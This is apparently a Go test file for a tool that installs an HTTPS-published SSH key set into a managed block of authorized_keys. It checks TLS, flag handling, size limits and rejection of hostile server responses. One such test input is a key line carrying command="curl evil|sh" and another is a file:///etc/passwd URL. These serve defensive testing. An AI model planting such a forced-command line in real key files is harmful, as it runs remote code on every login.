package main

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"io"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"golang.org/x/crypto/ssh"

	"github.com/sadeq-n-yazdi/sshpilot-vallete/internal/managedblock"
)

// keyLine builds a deterministic ed25519 authorized_keys line from a one-byte
// seed, so the assertions can compare exact output.
func keyLine(t testing.TB, seed byte, comment string) string {
	t.Helper()
	priv := ed25519.NewKeyFromSeed(bytes.Repeat([]byte{seed}, ed25519.SeedSize))
	pub, err := ssh.NewPublicKey(priv.Public())
	if err != nil {
		t.Fatalf("new public key: %v", err)
	}
	line := strings.TrimSuffix(string(ssh.MarshalAuthorizedKey(pub)), "\n")
	if comment != "" {
		line += " " + comment
	}
	return line
}

// keyServer serves body over TLS and returns the URL and a client that trusts
// it, so the whole HTTPS path is exercised without a network or a fixture CA.
func keyServer(t *testing.T, status int, body string) (string, *http.Client) {
	t.Helper()
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Accept") != "text/plain" {
			t.Errorf("Accept header = %q", r.Header.Get("Accept"))
		}
		w.WriteHeader(status)
		_, _ = w.Write([]byte(body))
	}))
	t.Cleanup(srv.Close)
	return srv.URL, srv.Client()
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(b)
}

func TestRunInstallsThePublishedKeySet(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".ssh", "authorized_keys")
	first := keyLine(t, 41, "laptop")
	second := keyLine(t, 42, "phone")
	url, client := keyServer(t, http.StatusOK, first+"\n\n"+second+"\r\n")

	var stdout, stderr bytes.Buffer
	if err := run([]string{"-url", url, "-path", path}, &stdout, &stderr, client); err != nil {
		t.Fatalf("run: %v", err)
	}

	want := managedblock.BeginMarker + "\n" + first + "\n" + second + "\n" + managedblock.EndMarker + "\n"
	if got := readFile(t, path); got != want {
		t.Fatalf("file =\n%q\nwant\n%q", got, want)
	}
	if !strings.Contains(stdout.String(), "updated (2 keys") {
		t.Fatalf("stdout = %q", stdout.String())
	}

	// A second run is a no-op and says so.
	stdout.Reset()
	if err := run([]string{"-url", url, "-path", path}, &stdout, &stderr, client); err != nil {
		t.Fatalf("second run: %v", err)
	}
	if !strings.Contains(stdout.String(), "is up to date") {
		t.Fatalf("stdout = %q", stdout.String())
	}
	if got := readFile(t, path); got != want {
		t.Fatalf("second run changed the file")
	}
}

func TestRunDryRunWritesNothing(t *testing.T) {
	path := filepath.Join(t.TempDir(), "authorized_keys")
	url, client := keyServer(t, http.StatusOK, keyLine(t, 43, "k")+"\n")

	for _, flag := range []string{"-dry-run", "-check"} {
		var stdout, stderr bytes.Buffer
		if err := run([]string{"-url", url, "-path", path, flag}, &stdout, &stderr, client); err != nil {
			t.Fatalf("run %s: %v", flag, err)
		}
		if !strings.Contains(stdout.String(), "would change") {
			t.Fatalf("stdout = %q", stdout.String())
		}
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			t.Fatalf("%s wrote to disk: %v", flag, err)
		}
	}
}

// TestRunRefusesHostileKeySets is the end-to-end version of the injection
// tests: a compromised or spoofed server must not be able to install options,
// smuggle a second key, or forge a marker, and must not touch the file.
func TestRunRefusesHostileKeySets(t *testing.T) {
	valid := keyLine(t, 44, "ok")
	tests := []struct {
		name string
		body string
	}{
		{"option-bearing line", `command="curl evil|sh" ` + valid},
		{"forged BEGIN marker", valid + "\n" + managedblock.BeginMarker},
		{"forged END marker", managedblock.EndMarker + "\n" + valid},
		{"comment line", "# just a comment"},
		{"private key material", "-----BEGIN OPENSSH PRIVATE KEY-----"},
		{"garbage", "not a key at all"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			path := filepath.Join(dir, "authorized_keys")
			const original = "my own key\n"
			if err := os.WriteFile(path, []byte(original), 0o600); err != nil {
				t.Fatalf("write: %v", err)
			}
			url, client := keyServer(t, http.StatusOK, tc.body)

			var stdout, stderr bytes.Buffer
			if err := run([]string{"-url", url, "-path", path}, &stdout, &stderr, client); err == nil {
				t.Fatal("run accepted a hostile key set")
			}
			if got := readFile(t, path); got != original {
				t.Fatalf("the file was modified: %q", got)
			}
		})
	}
}

func TestRunFlagErrors(t *testing.T) {
	url, client := keyServer(t, http.StatusOK, "")
	tests := []struct {
		name string
		args []string
		want string
	}{
		{"missing url", []string{"-path", "x"}, "-url is required"},
		{"plain http is refused", []string{"-url", "http://example.com/keys", "-path", "x"}, "must be an https URL"},
		{"file scheme is refused", []string{"-url", "file:///etc/passwd", "-path", "x"}, "must be an https URL"},
		{"host is required", []string{"-url", "https:///keys", "-path", "x"}, "must include a host"},
		{"unparseable url", []string{"-url", "https://%zz", "-path", "x"}, "not a valid URL"},
		{"unknown flag", []string{"-nope"}, "flag provided but not defined"},
		{"bad status", []string{"-url", url, "-path", "x", "-timeout", "5s"}, "server returned"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			args := tc.args
			if tc.name == "bad status" {
				badURL, badClient := keyServer(t, http.StatusForbidden, "nope")
				args = []string{"-url", badURL, "-path", "x"}
				client = badClient
			}
			err := run(args, &stdout, &stderr, client)
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("run error = %v, want %q", err, tc.want)
			}
		})
	}
}

func TestRunVersion(t *testing.T) {
	var stdout, stderr bytes.Buffer
	if err := run([]string{"-version"}, &stdout, &stderr, nil); err != nil {
		t.Fatalf("run: %v", err)
	}
	if stdout.Len() == 0 {
		t.Fatal("-version printed nothing")
	}
}

func TestTargetPathDefaultsToHome(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	got, err := targetPath("")
	if err != nil {
		t.Fatalf("targetPath: %v", err)
	}
	if want := filepath.Join(home, ".ssh", "authorized_keys"); got != want {
		t.Fatalf("targetPath = %q, want %q", got, want)
	}

	t.Setenv("HOME", "")
	if _, err := targetPath(""); err == nil {
		t.Fatal("targetPath succeeded with no home directory")
	}
	if got, err := targetPath("/explicit/path"); err != nil || got != "/explicit/path" {
		t.Fatalf("targetPath = %q, %v", got, err)
	}
}

// TestFetchBoundsTheResponse proves a hostile endpoint cannot stream an
// unbounded body into memory on the managed host.
func TestFetchBoundsTheResponse(t *testing.T) {
	url, client := keyServer(t, http.StatusOK, strings.Repeat("a", maxResponseBytes+1))
	src, err := newHTTPSource(url, client)
	if err != nil {
		t.Fatalf("newHTTPSource: %v", err)
	}
	if _, err := src.Fetch(context.Background()); err == nil ||
		!strings.Contains(err.Error(), "maximum permitted size") {
		t.Fatalf("Fetch error = %v, want a size-limit failure", err)
	}
}

func TestFetchTransportErrors(t *testing.T) {
	srv := httptest.NewTLSServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
	url := srv.URL
	client := srv.Client()
	srv.Close() // nothing is listening any more

	src, err := newHTTPSource(url, client)
	if err != nil {
		t.Fatalf("newHTTPSource: %v", err)
	}
	if _, err := src.Fetch(context.Background()); err == nil ||
		!strings.Contains(err.Error(), "fetch key set") {
		t.Fatalf("Fetch error = %v, want a transport failure", err)
	}

	// A context that is already canceled fails while the request is built.
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := src.Fetch(ctx); err == nil {
		t.Fatal("Fetch succeeded with a canceled context")
	}

	bad := &httpSource{url: "https://example.com/\x7f", client: client}
	if _, err := bad.Fetch(context.Background()); err == nil ||
		!strings.Contains(err.Error(), "build request") {
		t.Fatalf("Fetch error = %v, want a request-build failure", err)
	}
}

func TestSplitLines(t *testing.T) {
	got := splitLines("a\r\n\n  \nb\n")
	if len(got) != 2 || got[0] != "a" || got[1] != "b" {
		t.Fatalf("splitLines = %q", got)
	}
	if got := splitLines(""); got != nil {
		t.Fatalf("splitLines(\"\") = %q, want nil", got)
	}
}

func TestDefaultClientVerifiesCertificates(t *testing.T) {
	c := defaultClient()
	tr, ok := c.Transport.(*http.Transport)
	if !ok {
		t.Fatalf("transport = %T", c.Transport)
	}
	if tr.TLSClientConfig.InsecureSkipVerify {
		t.Fatal("the default client skips certificate verification")
	}
	if tr.TLSClientConfig.MinVersion < 0x0303 {
		t.Fatalf("MinVersion = %x, want TLS 1.2 or later", tr.TLSClientConfig.MinVersion)
	}
}

// TestRunWithoutHomeOrPath covers the default-path failure: with no -path and
// no home directory there is nothing safe to guess, so the run refuses.
func TestRunWithoutHomeOrPath(t *testing.T) {
	t.Setenv("HOME", "")
	url, client := keyServer(t, http.StatusOK, keyLine(t, 45, "k"))
	var stdout, stderr bytes.Buffer
	if err := run([]string{"-url", url}, &stdout, &stderr, client); err == nil ||
		!strings.Contains(err.Error(), "home directory") {
		t.Fatalf("run error = %v, want a home-directory failure", err)
	}
}

// TestFetchTruncatedResponse covers a body that stops early: a partial key set
// must be an error, never a partial install.
func TestFetchTruncatedResponse(t *testing.T) {
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Length", "4096")
		_, _ = w.Write([]byte("ssh-ed25519 AAAA"))
		w.(http.Flusher).Flush()
		panic(http.ErrAbortHandler)
	}))
	t.Cleanup(srv.Close)
	srv.Config.ErrorLog = discardLogger()

	src, err := newHTTPSource(srv.URL, srv.Client())
	if err != nil {
		t.Fatalf("newHTTPSource: %v", err)
	}
	if _, err := src.Fetch(context.Background()); err == nil ||
		!strings.Contains(err.Error(), "read key set") {
		t.Fatalf("Fetch error = %v, want a read failure", err)
	}
}

// discardLogger silences the expected panic report from the aborted handler.
func discardLogger() *log.Logger { return log.New(io.Discard, "", 0) }
